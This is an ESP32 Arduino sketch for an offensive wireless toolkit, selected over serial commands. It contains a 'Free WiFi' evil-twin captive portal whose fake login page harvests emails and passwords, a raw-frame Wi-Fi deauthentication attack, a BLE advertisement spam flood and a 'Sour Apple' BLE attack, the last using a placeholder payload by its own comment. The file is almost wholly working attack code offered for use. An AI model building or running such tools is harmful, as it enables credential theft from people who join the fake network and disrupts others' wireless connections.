#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

// ---------------- Captive Portal Variables and Functions ----------------
IPAddress apIP(172, 16, 0, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
WebServer webServer(80);
bool captivePortalActive = false;  // Flag indicating if captive portal is active
String currentAPSSID = "Free WiFi"; // Default AP SSID for non-captive functions
String capturedCredentials = "";

String loginPage() {
  return "<!DOCTYPE html>"
         "<html>"
         "<head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
         "<title>Login</title></head>"
         "<body>"
         "<h2>Login to access the Internet</h2>"
         "<form action=\"/post\" method=\"POST\">"
         "Email: <input type=\"text\" name=\"email\"><br>"
         "Password: <input type=\"password\" name=\"password\"><br>"
         "<input type=\"submit\" value=\"Login\">"
         "</form>"
         "</body>"
         "</html>";
}

String successPage() {
  return "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>Login Failed</title></head>"
         "<body><h2>Login Failed</h2><p>Something went Wrong, Try again at a later time.</p></body></html>";
}

void handleRoot() {
  webServer.send(200, "text/html", loginPage());
}

void handlePost() {
  String email = webServer.arg("email");
  String password = webServer.arg("password");
  capturedCredentials += "Email: " + email + " | Password: " + password + "\n";
  Serial.println("Captured Credentials:");
  Serial.println(capturedCredentials);
  webServer.send(200, "text/html", successPage());
}

void handleNotFound() {
  webServer.sendHeader("Location", String("http://") + apIP.toString(), true);
  webServer.send(302, "text/plain", "");
}

// ---------------- SerialMarauder Functions ----------------

// Global flag for debug LED behavior
bool debugLedEnabled = true;

// Modified activity LED: flashes only if debug LED is enabled
void activityLED() {
  if (debugLedEnabled) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(50);
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
  }
}

void scanWiFi() {
  Serial.println("Scanning for Wi-Fi networks...");
  int networks = WiFi.scanNetworks();
  for (int i = 0; i < networks; i++) {
    Serial.printf("%d: %s (RSSI: %d) MAC: %s Channel: %d\n",
                  i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i),
                  WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
    activityLED(); // Flash LED after printing each network
  }
  Serial.println("Wi-Fi scan complete.");
}

void deauthAttack(const char *targetMAC) {
  uint8_t mac[6];
  sscanf(targetMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  
  int networks = WiFi.scanNetworks();
  int targetChannel = 1; // default fallback
  for (int i = 0; i < networks; i++) {
    if (WiFi.BSSIDstr(i).equalsIgnoreCase(targetMAC)) {
      targetChannel = WiFi.channel(i);
      break;
    }
  }
  
  Serial.printf("Switching to channel %d for deauth attack on %s\n", targetChannel, targetMAC);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  
  activityLED(); // Flash LED before sending packet
  
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    0x00, 0x00, 0x07, 0x00
  };
  
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  esp_wifi_set_promiscuous(false);
  
  Serial.println("Deauth attack attempted.");
}

void scanBLE() {
  Serial.println("Scanning for BLE devices...");
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  BLEScanResults foundDevices = *pBLEScan->start(5, false);
  int count = foundDevices.getCount();
  for (int i = 0; i < count; i++) {
    BLEAdvertisedDevice device = foundDevices.getDevice(i);
    String deviceName = device.haveName() ? device.getName().c_str() : "Unknown";
    Serial.printf("Device %d: %s (Name: %s) (RSSI: %d)\n",
                  i + 1, device.getAddress().toString().c_str(),
                  deviceName.c_str(), device.getRSSI());
    activityLED();  // Flash LED for each BLE device found
  }
  Serial.println("BLE scan complete.");
}

void blespamAttack() {
  Serial.println("Starting BLE spam attack for 5 seconds...");
  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advData;
  unsigned long startTime = millis();
  
  while (millis() - startTime < 5000) {  // Run for 5 seconds
    char payload[32];
    for (int i = 0; i < 31; i++) {
      payload[i] = (char)random(0, 256);
    }
    payload[31] = '\0';
    String randomPayload = String(payload);
    
    advData.setManufacturerData(randomPayload);
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setScanResponseData(advData);
    
    activityLED();  // Flash LED with each burst
    pAdvertising->start();
    delay(10);      // Short burst duration
    pAdvertising->stop();
  }
  Serial.println("BLE spam attack complete.");
}

// New function: Sour Apple attack – sends a fixed, malicious BLE payload
void sourAppleAttack() {
  Serial.println("Starting Sour Apple attack for 5 seconds...");
  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advData;
  
  // Craft a fixed payload known to exploit the vulnerability.
  // (For demonstration, we use a 31-byte string of "A" characters.
  // In a real exploit, this payload might be a specific sequence of bytes.)
  String exploitPayload = String('A', 31);
  advData.setManufacturerData(exploitPayload);
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->setScanResponseData(advData);
  
  unsigned long startTime = millis();
  while (millis() - startTime < 5000) {  // Run for 5 seconds
    activityLED();
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();
  }
  Serial.println("Sour Apple attack complete.");
}

void toggleDebugLED() {
  debugLedEnabled = !debugLedEnabled;
  Serial.print("Debug LED is now ");
  Serial.println(debugLedEnabled ? "ENABLED" : "DISABLED");
}

// ---------------- Setup & Loop ----------------
void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);

  Serial.begin(115200);

  // Setup Wi-Fi in AP mode for SerialMarauder functions (captive portal remains off by default)
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  // Start AP with the default SSID "Free WiFi"
  WiFi.softAP(currentAPSSID.c_str());
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());

  // Setup captive portal routes (but do not start the server yet)
  webServer.on("/", handleRoot);
  webServer.on("/post", HTTP_POST, handlePost);
  webServer.onNotFound(handleNotFound);

  // Print available serial commands
  Serial.println("Available commands via Serial:");
  Serial.println("  scan         - Wi-Fi scan");
  Serial.println("  deauth <MAC> - Deauth attack");
  Serial.println("  blescan      - BLE scan");
  Serial.println("  blespam      - BLE spam attack (5 sec)");
  Serial.println("  sourapple    - Sour Apple attack (5 sec, fixed payload)");
  Serial.println("  led          - Toggle debug LED flashing");
  Serial.println("  portal       - Toggle captive portal SSID");
  Serial.println("                (Activates with \"0x4F\" if off, then toggles to \"Free WiFi\" and back)");
  Serial.println("  stopportal   - Deactivate captive portal");
}

void loop() {
  // Process captive portal only if active
  if (captivePortalActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  // Process Serial commands
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    
    if (command == "scan") {
      scanWiFi();
    } else if (command.startsWith("deauth ")) {
      String targetMAC = command.substring(7);
      deauthAttack(targetMAC.c_str());
    } else if (command == "blescan") {
      scanBLE();
    } else if (command == "blespam") {
      blespamAttack();
    } else if (command == "sourapple") {
      sourAppleAttack();
    } else if (command == "led") {
      toggleDebugLED();
    } else if (command == "portal") {
      // If portal is not active, activate with SSID "0x4F"
      if (!captivePortalActive) {
        currentAPSSID = "0x4F";
        dnsServer.start(53, "*", apIP);
        webServer.begin();
        captivePortalActive = true;
        WiFi.softAP(currentAPSSID.c_str());
        Serial.print("Captive portal activated with SSID: ");
        Serial.println(currentAPSSID);
      } else {
        // Toggle SSID between "0x4F" and "Free WiFi"
        if (currentAPSSID == "0x4F") {
          currentAPSSID = "Free WiFi";
        } else {
          currentAPSSID = "0x4F";
        }
        // Restart AP with new SSID
        WiFi.softAP(currentAPSSID.c_str());
        Serial.print("Captive portal SSID changed to: ");
        Serial.println(currentAPSSID);
      }
    } else if (command == "stopportal") {
      if (captivePortalActive) {
        webServer.stop();
        captivePortalActive = false;
        Serial.println("Captive portal deactivated.");
      } else {
        Serial.println("Captive portal is not active.");
      }
    } else {
      Serial.println("Invalid command. Use: scan | deauth <MAC> | blescan | blespam | sourapple | led | portal | stopportal");
    }
  }
}
